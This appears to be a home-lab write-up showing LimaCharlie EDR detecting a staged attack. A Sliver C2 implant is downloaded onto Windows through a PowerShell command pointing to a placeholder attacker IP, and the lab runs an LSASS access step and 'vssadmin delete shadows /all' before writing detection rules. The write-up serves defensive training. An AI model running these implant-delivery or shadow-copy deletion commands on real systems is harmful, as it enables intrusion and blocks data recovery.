# LimaCharlie Home Lab 

## Payload 

To begin the lab, we start by creating a Sliver-Server C2 implant using an Ubuntu server. We can generate the C2 session payload for later use on the Windows host by using the "generate --http [Linux_VM_IP]" command.
After executing the command, the payload is successfully generated. 
To proceed with the attack, it is crucial to set up a temporary web server using Ubuntu.


![Implant](https://imgur.com/ZUlmbbI.png)



## Command & Control Session 
After generating the payload, the C2 payload can be downloaded to the Windows host using PowerShell with the following command:

IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile [output_file_name].exe


![Implant](https://imgur.com/1N5e133.png)



After successfully installing the payload, go back to Sliver and start an HTTP listener to initiate a session when executing the C2 implant. This can be done by returning to the host and executing the payload again using the command: C:\Users\User\Downloads\<your_C2-implant>.exe.


![Implant](https://imgur.com/WUbpOXR.png)



Once the command is entered, the HTTP listener will detect the session, allowing the C2 infrastructure to gain control over the compromised Windows system.

![Implant](https://imgur.com/8SEuUcI.png)


## Executing Commands
By uitlizing the session ID, an attacker gains unauthorized access to the Windows host machine. This allows them to execute commands and collect information from the compromised system. The accompanying images demonstrate the execution of commands such as "whoami" and "getprivs" to retrieve specific information. The attacker can also monitor the processes on the machine, indicated by the highlighted payload in green. Additionally, the presence of defensive tools is detected.


![Implant](https://imgur.com/TlBE3yB.png)
![Implant](https://imgur.com/D8pyCEK.png)
![Implant](https://imgur.com/jWUgJ0z.png)





## LimaCharlie EDR

Process Anayalsis: To initiate threat hunting, we will leverage LimaCharlie's EDR telemetry capabilities to detect and locate Indicators of Compromise (IOCs). We begin by examining the processes on the system. If we come across any suspicious processes, we will escalate the situation and proceed with a more in-depth investigation to gather additional information.

![Implant](https://imgur.com/cJI2g0y.png)

Network Anaylsis: By conducting a deeper analysis of the network, we can observe the C2 implant establishing connections through the hosted HTTP server. This generates suspicious HTTP requests, which serve as IOC indicating malicious activity. This discovery confirms that there is ongoing malicious behavior.


![Implant](https://imgur.com/s6yg1nc.png)

File System Analysis: To obtain more information about the malicious file, LimaCharlie's file system tab provides pertinent details about the location and current execution of the implant. This resource will help us gather additional insights into the implant and its activities.


![Implant](https://imgur.com/bTX7Djr.png)


Hash Analysis: In the File System tab, clicking on the suspicious executable enables us to inspect its hash by scanning it with VirusTotal. However, when querying VirusTotal for known malware samples, it was not able to locate any matches for the file. This underscores the importance of recognizing that the absence of a detection on VirusTotal does not necessarily indicate innocence.


![Implant](https://imgur.com/TUox88F.png)


Timeline Analysis: LimaCharlie offers a real-time view of EDR telemetry and event logs streaming from the system. Its filter options provide a convenient way to narrow down the timeline based on the IOC. By identifying the name of the implant, it highlights the associated implant processes discovered. This enables us to examine the events and gather valuable insights to aid in mitigating the threat and enhance our detection rules.


![Implant](https://imgur.com/9Dekpxd.png)

## Credential Dumping

A key objective of threat actors is to acquire the credentials of their target, which can help them achieve their goals, such as lateral movement. One technique that facilitates this objective is known as LSASS credential dumping. LSASS (Local Security Authority Subsystem Service) stores operating system credentials and domain administrator credentials in its process memory.


![Implant](https://imgur.com/sxc279T.png)



To mitigate this risk, we will create a detection rule in LimaCharlie to receive alerts when the LSASS process is accessed. To begin, we will identify the relevant events by filtering for "SENSITIVE_PROCESS_ACCESS" events in the timeline. Once we have identified an LSASS process, we will click on the event to create the detection and response rule. In this rule, we will configure it to generate a report whenever the LSASS command is detected.

![Implant](https://imgur.com/1oJbSxh.png)
![Implant](https://imgur.com/yD6FZWK.png)



Now, when we execute the LSASS dump command again, it will generate a report on the detection page indicating that the LSASS process has been accessed. This report will enable further investigation to determine whether it's a false positive or a true positive.


![Implant](https://imgur.com/vnVpEjS.png)



## Blocking Attacks

A common indicator of a ransomware attack is the deletion of volume shadow copies, which are used to restore individual files or an entire file system. Threat actors frequently remove these volume shadow copies to prevent easy recovery of the encrypted data.

To initiate the attack, we will gain access to the compromised system shell through the C2 session. Once inside the shell, we will execute the command "vssadmin delete shadows /all" to delete the shadow copies. We will then use the "whoami" command to verify that we have an active system shell.


![Implant](https://imgur.com/iRM8C2S.png)
![Implant](https://imgur.com/FCGbAvC.png)


In LimaCharlie's detection tab, it detects the deletion of shadow volumes. From there, we can click on the detection event and access the event timeline for further examination. This allows us to carefully analyze the event and create a detection and response rule based on the information gathered.


![Implant](https://imgur.com/aVB0uX2.png)
![Implant](https://imgur.com/S8ZKPtt.png)


The crafted rule generates a report whenever the VSS deletion command is executed and subsequently terminates the parent process responsible for that command. This effectively prevents the threat actor from performing lateral movement. The accompanying images demonstrate the inability to retrieve any output from the "whoami" command due to the termination of the parent process.


![Implant](https://imgur.com/GqwKm3U.png)
![Implant](https://imgur.com/TOshiKq.png)


## Conclusion 

In this LimaCharlie homelab, we have delved into the intricate details of a cyber attack scenario and explored the capabilities of LimaCharlie's platform in detecting, analyzing, and responding to various stages of the attack. By examining each step, we have gained a deeper understanding of the tactics and techniques employed by threat actors, as well as the countermeasures that can be implemented to mitigate the risks.

The lab began with the creation of a Sliver-Server C2 implant, which served as the initial payload for compromising a Windows host. We learned how to generate the payload and set up a temporary web server to deliver it to the target system. The subsequent establishment of the command and control session allowed the attacker to gain control over the compromised Windows system. Through this session, commands could be executed, and valuable information could be extracted from the compromised system.

LimaCharlie's EDR capabilities played a crucial role in the lab, enabling us to detect and analyze indicators of compromise. We explored process analysis, network analysis, file system analysis, hash analysis, and timeline analysis to gather valuable insights into the attacker's activities. By leveraging LimaCharlie's telemetry data, we were able to identify suspicious processes, detect C2 communications, examine file-related activities, and even scan files with VirusTotal for known malware samples. The real-time event timeline provided by LimaCharlie facilitated a comprehensive view of the attack's progression, allowing for effective threat hunting and rule creation.

One of the significant risks we focused on was credential dumping, a technique commonly used by threat actors to acquire sensitive information. We explored the detection and response capabilities of LimaCharlie in identifying access to the Local Security Authority Subsystem Service (LSASS), where critical credentials are stored. By creating a detection rule, we received alerts whenever the LSASS process was accessed, enabling us to investigate potential unauthorized access attempts.

The lab also addressed the need to block attacks, particularly those involving the deletion of volume shadow copies, a common tactic used by ransomware attackers to hinder data recovery. By executing the attack and leveraging LimaCharlie's detection capabilities, we were able to identify the deletion of shadow volumes and respond proactively by terminating the parent process responsible for the attack. This action effectively prevented further lateral movement and restricted the attacker's ability to cause more damage.

Overall, the LimaCharlie homelab has provided valuable hands-on experience in understanding the intricacies of a cyber attack and the role of an advanced EDR platform in detecting, analyzing, and responding to various stages of the attack lifecycle. By harnessing the power of LimaCharlie's features, such as real-time telemetry, event analysis, and detection and response rules, organizations can bolster their security posture, improve threat detection capabilities, and enhance incident response efforts. It is through such practical exercises that we can better prepare ourselves to defend against ever-evolving cyber threats in today's digital landscape.



## Credit
Inspired by [Eric Capuano](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro?sd=pf)


Educational use only.



































